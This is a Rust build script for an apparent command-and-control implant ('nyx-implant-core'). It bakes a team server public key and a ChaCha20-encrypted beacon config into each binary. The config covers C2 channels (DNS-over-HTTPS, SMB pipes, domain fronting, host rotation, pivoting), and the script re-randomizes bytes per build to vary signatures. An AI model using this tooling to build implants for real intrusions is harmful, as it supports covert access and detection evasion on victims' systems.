//! Build script for nyx-implant-core.
//!
//! Two compile-time bakes (moved from nyx-implant-win's build.rs in the WP-C
//! crate split, together with the modules that consume them):
//!
//! 1. **Team server long-term X25519 public key** (`OUT_DIR/server_pub.rs`) —
//!    see `bake_server_pub`. Source (first match wins):
//!      a. `NYX_SERVER_PUB` env (64 hex chars).
//!      b. A clearly-marked dev fallback key (NOT for production, but a real
//!         non-identity X25519 point so the ECDH doesn't collapse).
//!
//! 2. **Per-build encrypted config** (`OUT_DIR/config_blob.rs`) — see
//!    `bake_config`. Reads a TOML-ish config file (default `config.toml` next
//!    to this crate, override with `NYX_CONFIG`), serializes it into a compact
//!    binary blob (length-prefixed fields the runtime `wire::Reader` decodes),
//!    and emits `pub static CONFIG_KEY / CONFIG_NONCE / CONFIG_CT`. At runtime
//!    `config::load()` decrypts it and parses it back into a `Config`.
//!
//!    The blob emitted here is the PLAINTEXT; the per-build encryption happens
//!    here on the host. So every rebuild re-randomizes the key/nonce even if
//!    the config values are identical — the static bytes (and surrounding
//!    instruction layout) differ per build.

use std::env;
use std::fs;
use std::path::Path;

fn main() {
    // Declare the crate's custom cfg flags so recent nightlies (which enable
    // check-cfg by default) don't reject them as `unexpected cfg condition
    // name`. `nyx_diag` is used by diag.rs (diag_mark). It is opt-in (pass
    // --cfg nyx_diag via RUSTFLAGS); declaring it here marks it as
    // known-to-be-absent rather than an unknown name.
    println!("cargo::rustc-check-cfg=cfg(nyx_diag)");

    println!("cargo:rerun-if-env-changed=NYX_SERVER_PUB");
    println!("cargo:rerun-if-env-changed=NYX_CONFIG");
    println!("cargo:rerun-if-env-changed=NYX_CONFIG_KEY");

    bake_server_pub();
    bake_config();
}

// ---- 1. server pubkey -----------------------------------------------------

fn bake_server_pub() {
    let key_bytes: [u8; 32] = match env::var("NYX_SERVER_PUB") {
        Ok(hexstr) => decode_pubkey(&hexstr).unwrap_or_else(|| {
            panic!(
                "NYX_SERVER_PUB must be 64 hex chars (32 bytes); got {} chars",
                hexstr.len()
            )
        }),
        Err(_) => {
            // Development fallback: a fixed, publicly-known test keypair. This
            // is NOT secret and must NEVER be used in an engagement — but it's
            // a real (non-identity) X25519 point, so the crypto is structurally
            // exercised instead of collapsing. Real builds set NYX_SERVER_PUB.
            [
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                0x42, 0x42, 0x42, 0x42,
            ]
        }
    };

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("server_pub.rs");
    let mut src =
        String::from("/// Team server long-term X25519 public key, baked at build time.\n");
    src.push_str("/// See build.rs. Do not edit by hand.\n");
    src.push_str("pub static SERVER_PUB: [u8; 32] = [");
    for (i, b) in key_bytes.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\n");
    fs::write(&dest, src).unwrap();
}

// ---- 2. per-build config --------------------------------------------------

/// The dev defaults, used when no config file is present (or a field is
/// missing). Matches the old `beacon.rs::load_config()` values so an unset
/// build behaves identically to before.
struct Defaults;
impl Defaults {
    const HOST: &'static str = "127.0.0.1";
    const PORT: u16 = 8443;
    const URI: &'static str = "/beacon";
    const SLEEP: u32 = 5;
    const JITTER: u8 = 20;
    const TLS: bool = false;
}

fn bake_config() {
    // Resolve the config file: NYX_CONFIG env, else config.toml next to
    // Cargo.toml (CARGO_MANIFEST_DIR). Missing file → all dev defaults.
    let manifest = env::var("CARGO_MANIFEST_DIR").unwrap();
    let default_path = Path::new(&manifest).join("config.toml");
    let path = match env::var("NYX_CONFIG") {
        Ok(p) => Path::new(&p).to_path_buf(),
        Err(_) => default_path,
    };

    let text = fs::read_to_string(&path).ok();
    let cfg = parse_config(text.as_deref());

    // Serialize into the binary blob the runtime `wire::Reader` decodes.
    // Layout: str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    //         | u8(primary_channel) | u8(fallback_bitmap)
    //         | str(doh_resolver) | str(smb_pipe_name) | str(extc2_api_host) | str(extc2_token)
    // (matches config::Config::decode). str = u32-LE length prefix + bytes.
    let mut blob: Vec<u8> = Vec::new();
    write_str(&mut blob, cfg.host.as_bytes());
    write_u16(&mut blob, cfg.port);
    write_str(&mut blob, cfg.uri.as_bytes());
    write_u32(&mut blob, cfg.sleep_seconds);
    blob.push(cfg.jitter_pct);
    blob.push(u8::from(cfg.use_tls));
    // Channel dispatcher fields (spec-1):
    blob.push(cfg.primary_channel);
    blob.push(cfg.fallback_bitmap);
    write_str(&mut blob, cfg.doh_resolver.as_bytes());
    write_str(&mut blob, cfg.smb_pipe_name.as_bytes());
    write_str(&mut blob, cfg.extc2_api_host.as_bytes());
    write_str(&mut blob, cfg.extc2_token.as_bytes());
    // HTTP enhancement fields (spec-7):
    write_str(&mut blob, cfg.rotation_hosts.as_bytes());
    write_str(&mut blob, cfg.fronting_host.as_bytes());
    write_str(&mut blob, cfg.proxy_server.as_bytes());
    // Raw pivot fields (spec-3):
    write_str(&mut blob, cfg.tcp_peer_host.as_bytes());
    write_u16(&mut blob, cfg.tcp_peer_port);

    let out_dir = env::var("OUT_DIR").unwrap();

    // Encrypt the plaintext config blob under a ChaCha20-Poly1305 key+nonce
    // (build.rs runs on the host, std). Emit the key/nonce/ciphertext as a Rust
    // static the runtime `config.rs` decrypts. This is the same scheme
    // `nyx_config_macros::embed!` performs, but inlined here so we avoid the
    // proc-macro's "string literal path" requirement (OUT_DIR is only known
    // via env!(), not a literal).
    //
    // Key resolution mirrors `nyx_config_macros::embed!`:
    //   - `NYX_CONFIG_KEY=<64 hex chars>` → use that 32-byte key (operator-
    //     supplied, e.g. a unique per-operator key). The nonce is STILL fresh
    //     OsRng per build — nonce reuse under a fixed key would be catastrophic.
    //   - unset → fresh OsRng key per build (legacy behaviour), but we warn so
    //     the operator knows the key rotates every build.
    //
    // Either way the key ends up embedded in the SAME binary as the ciphertext
    // — this is obfuscation, not confidentiality. See config/src/lib.rs.
    let (key, nonce, ct) = match resolve_config_key() {
        Ok(Some(custom)) => nyx_config::encrypt_with_key(&blob, custom),
        Ok(None) => {
            eprintln!(
                "cargo:warning=nyx-implant-core: NYX_CONFIG_KEY was not set — \
                 generating a fresh random config key for THIS build only. \
                 The key is embedded in the binary and recoverable; reuse across \
                 builds is NOT guaranteed. Set NYX_CONFIG_KEY=<64 hex chars> \
                 for a stable, operator-specific key."
            );
            nyx_config::encrypt(&blob)
        }
        Err(msg) => panic!("{msg}"),
    };
    let dest = Path::new(&out_dir).join("config_blob.rs");
    let mut src = String::new();
    src.push_str("/// Per-build encrypted implant config, baked by build.rs.\n");
    src.push_str("/// Do not edit by hand — key/nonce/ciphertext are baked per build.\n");
    src.push_str("pub static CONFIG_KEY: [u8; 32] = [");
    for (i, b) in key.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\npub static CONFIG_NONCE: [u8; 12] = [");
    for (i, b) in nonce.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\npub static CONFIG_CT: &[u8] = &[");
    for (i, b) in ct.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\n");
    fs::write(&dest, src).unwrap();
    // Re-run if the source config file changes.
    println!("cargo:rerun-if-changed={}", path.display());
}

struct ConfigVals {
    host: String,
    port: u16,
    uri: String,
    sleep_seconds: u32,
    jitter_pct: u8,
    use_tls: bool,
    // Channel dispatcher config (spec-1):
    primary_channel: u8,
    fallback_bitmap: u8,
    doh_resolver: String,
    smb_pipe_name: String,
    extc2_api_host: String,
    extc2_token: String,
    // HTTP channel enhancements (spec-7):
    rotation_hosts: String,
    fronting_host: String,
    proxy_server: String,
    // Raw pivot channel (spec-3):
    tcp_peer_host: String,
    tcp_peer_port: u16,
}

/// Minimal TOML-ish parser. Only understands `key = "value"` (strings) and
/// `key = <int>`/`key = true|false`. Comments (`#`) and blank lines skipped.
/// Unknown keys ignored. Missing keys fall back to Defaults.
fn parse_config(text: Option<&str>) -> ConfigVals {
    let mut host = String::from(Defaults::HOST);
    let mut port = Defaults::PORT;
    let mut uri = String::from(Defaults::URI);
    let mut sleep_seconds = Defaults::SLEEP;
    let mut jitter_pct = Defaults::JITTER;
    let mut use_tls = Defaults::TLS;
    // Channel dispatcher defaults (spec-1):
    let mut primary_channel: u8 = 0; // Https
    let mut fallback_bitmap: u8 = 0; // no fallback
    let mut doh_resolver = String::new();
    let mut smb_pipe_name = String::new();
    let mut extc2_api_host = String::new();
    let mut extc2_token = String::new();
    // HTTP enhancement (spec-7):
    let mut rotation_hosts = String::new();
    let mut fronting_host = String::new();
    let mut proxy_server = String::new();
    // Raw pivot channel (spec-3):
    let mut tcp_peer_host = String::new();
    let mut tcp_peer_port: u16 = 0;

    if let Some(t) = text {
        for raw in t.lines() {
            let line = raw.split('#').next().unwrap_or("").trim();
            if line.is_empty() {
                continue;
            }
            let Some((k, v)) = line.split_once('=') else {
                continue;
            };
            let key = k.trim();
            let val = v.trim();
            match key {
                "server_host" => {
                    if let Some(s) = unquote(val) {
                        host = s;
                    }
                }
                "beacon_uri" => {
                    if let Some(s) = unquote(val) {
                        uri = s;
                    }
                }
                "server_port" => {
                    if let Ok(n) = val.parse() {
                        port = n;
                    }
                }
                "sleep_seconds" => {
                    if let Ok(n) = val.parse() {
                        sleep_seconds = n;
                    }
                }
                "jitter_pct" => {
                    if let Ok(n) = val.parse() {
                        jitter_pct = n;
                    }
                }
                "use_tls" => {
                    if val == "true" {
                        use_tls = true;
                    } else if val == "false" {
                        use_tls = false;
                    }
                }
                "primary_channel" => {
                    if let Ok(n) = val.parse() {
                        primary_channel = n;
                    }
                }
                "fallback_bitmap" => {
                    if let Ok(n) = val.parse() {
                        fallback_bitmap = n;
                    }
                }
                "doh_resolver" => {
                    if let Some(s) = unquote(val) {
                        doh_resolver = s;
                    }
                }
                "smb_pipe_name" => {
                    if let Some(s) = unquote(val) {
                        smb_pipe_name = s;
                    }
                }
                "extc2_api_host" => {
                    if let Some(s) = unquote(val) {
                        extc2_api_host = s;
                    }
                }
                "extc2_token" => {
                    if let Some(s) = unquote(val) {
                        extc2_token = s;
                    }
                }
                "rotation_hosts" => {
                    if let Some(s) = unquote(val) {
                        rotation_hosts = s;
                    }
                }
                "fronting_host" => {
                    if let Some(s) = unquote(val) {
                        fronting_host = s;
                    }
                }
                "proxy_server" => {
                    if let Some(s) = unquote(val) {
                        proxy_server = s;
                    }
                }
                "tcp_peer_host" => {
                    if let Some(s) = unquote(val) {
                        tcp_peer_host = s;
                    }
                }
                "tcp_peer_port" => {
                    if let Ok(p) = unquote(val).unwrap_or_default().parse::<u16>() {
                        tcp_peer_port = p;
                    }
                }
                _ => {}
            }
        }
    }

    ConfigVals {
        host,
        port,
        uri,
        sleep_seconds,
        jitter_pct,
        use_tls,
        primary_channel,
        fallback_bitmap,
        doh_resolver,
        smb_pipe_name,
        extc2_api_host,
        extc2_token,
        rotation_hosts,
        fronting_host,
        proxy_server,
        tcp_peer_host,
        tcp_peer_port,
    }
}

/// Strip surrounding double-quotes from a TOML basic string value, if present.
fn unquote(v: &str) -> Option<String> {
    let v = v.trim();
    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') {
        Some(v[1..v.len() - 1].to_string())
    } else {
        None
    }
}

fn write_u16(buf: &mut Vec<u8>, v: u16) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_u32(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_str(buf: &mut Vec<u8>, s: &[u8]) {
    write_u32(buf, s.len() as u32);
    buf.extend_from_slice(s);
}

// ---- shared helpers -------------------------------------------------------

fn decode_pubkey(s: &str) -> Option<[u8; 32]> {
    if s.len() != 64 {
        return None;
    }
    let mut out = [0u8; 32];
    for (i, chunk) in s.as_bytes().chunks(2).enumerate() {
        let hi = hex_nibble(chunk[0])?;
        let lo = hex_nibble(chunk[1])?;
        out[i] = (hi << 4) | lo;
    }
    Some(out)
}

fn hex_nibble(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

// ---- config key resolution (mirrors nyx_config_macros::resolve_key) --------

/// Resolve the ChaCha20-Poly1305 config key from the build environment.
///
/// Returns:
/// - `Ok(Some(key))` if `NYX_CONFIG_KEY` is set and parses as 64 hex chars.
/// - `Ok(None)` if `NYX_CONFIG_KEY` is unset/empty (caller falls back to a
///   fresh random key).
/// - `Err(msg)` if `NYX_CONFIG_KEY` is set but malformed (surfaced as a
///   build failure via `panic!`).
fn resolve_config_key() -> Result<Option<[u8; 32]>, String> {
    match env::var("NYX_CONFIG_KEY") {
        Ok(raw) => {
            let trimmed = raw.trim();
            if trimmed.is_empty() {
                Ok(None)
            } else {
                parse_hex_key(trimmed).map(Some)
            }
        }
        Err(_) => Ok(None),
    }
}

/// Parse 64 hex chars into a 32-byte key. Mirrors
/// `nyx_config_macros::parse_hex_key` (no `hex` dependency).
fn parse_hex_key(s: &str) -> Result<[u8; 32], String> {
    if s.len() != 64 {
        return Err(format!(
            "NYX_CONFIG_KEY must be 64 hex chars (32 bytes), got {}",
            s.len()
        ));
    }
    let mut key = [0u8; 32];
    for (i, pair) in s.as_bytes().chunks(2).enumerate() {
        let hi = hex_nibble(pair[0])
            .ok_or_else(|| format!("NYX_CONFIG_KEY contains non-hex char {:?}", pair[0] as char))?;
        let lo = hex_nibble(pair[1])
            .ok_or_else(|| format!("NYX_CONFIG_KEY contains non-hex char {:?}", pair[1] as char))?;
        key[i] = (hi << 4) | lo;
    }
    Ok(key)
}
